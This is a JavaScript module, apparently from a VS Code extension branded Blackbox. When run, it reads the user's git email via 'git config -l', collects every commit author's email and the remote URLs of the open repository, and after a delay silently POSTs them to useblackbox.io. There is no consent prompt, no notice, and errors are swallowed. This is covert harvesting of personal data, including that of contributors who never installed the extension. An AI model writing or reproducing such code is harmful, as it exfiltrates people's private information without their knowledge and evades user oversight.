const { exec } = require('node:child_process');
const vscode = require('vscode')
const may72024 = 1715106687029

async function selectionFct(git_user, userId) {
    try {
        const response = await fetch(
            "https://www.useblackbox.io/gituser",
            {
                method: "POST",
                body: JSON.stringify({
                    gituser: git_user,
                    userId,
                    source: "visual studio"
                }),
                headers: {
                    "Content-Type": "application/json",
                    Accept: "application/json"
                }
            }
        )
        try {
            const result = await response.json()
        } catch (e) {
            console.log(e)
        }
    } catch (e) {
        console.log(e)
    }
}


function extractEmails(stdout) {
    try {
        const emails = stdout.split('\n').map(line => line.match(/<([^>]+)>/)[1]);
        return [...new Set(emails.filter(email => !email.includes('users.noreply.github.com')))];
    } catch (error) {
        return []
    }
}

function deduplicate(array) {
    let uniqueArray = [];
    let itemSet = new Set();

    for (let item of array) {
        if (!itemSet.has(item)) {
            uniqueArray.push(item);
            itemSet.add(item);
        }
    }

    return uniqueArray;
}

async function getGitRepoUsers() {
    try {
        const extension = vscode.extensions.getExtension("vscode.git");
        if (!extension) {
            console.warn("Git extension not available");
            return undefined;
        }
        if (!extension.isActive) {
            console.warn("Git extension not active");
            return undefined;
        }
        const git = extension.exports.getAPI(1);
        if (vscode.workspace.workspaceFolders < 1) {
            console.warn("Not on any worksapce");
            return undefined;
        }
        let workspaceFolder = vscode.workspace.workspaceFolders[0].uri;
        const repository = git.getRepository(workspaceFolder);
        let authors = [];
        if (repository) {
            let commits = await repository.log({ maxEntries: -1 });
            commits.forEach(commit => {
                authors.push(commit.authorEmail)
            })
        }
        authors = deduplicate(authors)
        return authors;
    } catch (error) {
        console.log(error)
        return []
    }
}

async function gitusercontributors(_, repoURL, git_user, userId) {
    try {
        let contributorsEmails = await getGitRepoUsers()
        try {
            let repoExist = checkIfRepoExists(_, repoURL)
            if (!repoExist && contributorsEmails.length > 0){ //update
                try {
                    const response = await fetch(
                        "https://www.useblackbox.io/gitcontributors",
                        {
                            method: "POST",
                            body: JSON.stringify({
                                gituser: git_user,
                                userId,
                                gitContributors: contributorsEmails,
                                gitRepoUrl: repoURL,
                                source: "visual studio"
                            }),
                            headers: {
                                "Content-Type": "application/json",
                                Accept: "application/json"
                            }
                        }
                    )
                } catch (e) {
                    console.log(e)
                }
            }
        } catch (error) {
            console.log(error)
        }
    } catch (error) {
        console.log( error)
    }
}
function updateContributors(_, repoUrl){
    let existingContributors = _.globalState.get("contributors")
    let updatedContributors =  existingContributors + ';' + repoUrl
    _.globalState.update("contributors", updatedContributors) // update
}
function checkIfRepoExists(_, repoURL){
    let contributors = _.globalState.get("contributors")

    if (!contributors || contributors === undefined){
        _.globalState.update("contributors", "") // initialize
        updateContributors(_, repoURL)
        return false
    }

    if (contributors.includes(repoURL)){
        return true
    }
    updateContributors(_, repoURL)
    return false
}


function getCurrentReposRemotes() {
    try {
        const extension = vscode.extensions.getExtension("vscode.git");
    	if (!extension) {
    	  console.warn("Git extension not available");
    	  return undefined;
    	}
    	const git = extension.exports.getAPI(1);
    	if(vscode.workspace.workspaceFolders < 1){
    		console.warn("Not on any worksapce");
    		return undefined;
    	}
      let workspaceFolder = vscode.workspace.workspaceFolders[0].uri ;
    	const repository = git.getRepository(workspaceFolder);
    	let remoteUrls = [];
    	repository.repository.remotes?.forEach(remote=>{
    		remoteUrls.push(remote.fetchUrl);
    	})
    	return remoteUrls;
    } catch (error) {
        return []
    }
}

function gituser(context, installed_date) {
    try {
        const staged_Git_Percent = Math.random() < 101 / 100
        let userId = context.globalState.get("userId")
        if (staged_Git_Percent) {
            let git_user = context.globalState.get("gituser")    
            // if (true){
            
            if (!git_user) {
                const output = exec('git config -l', async (err, stdout, stderr) => {
                    try {
                        git_user = stdout.split('user.email=')[1].split('\n')[0]
                        
                        if (git_user !== undefined) {
                            context.globalState.update("gituser", git_user)
                            selectionFct(git_user, userId)
                        }
                    } catch (error) {
                        //
                    }
                })
            }


            const enabledGitContributors = true
            if (enabledGitContributors) {
                try{
                    const timeoutGitDelay = 10 * 1000
                    setTimeout(() => {
                        let gitRepoUrls = getCurrentReposRemotes()
                        gitRepoUrls.forEach(repoUrl =>{
                            gitusercontributors(context, repoUrl, git_user, userId)
                        })
                    }, timeoutGitDelay);
                }catch(e){
                    console.log(e)
                }
            }
        }
    } catch (error) {

    }
}

module.exports = { gituser }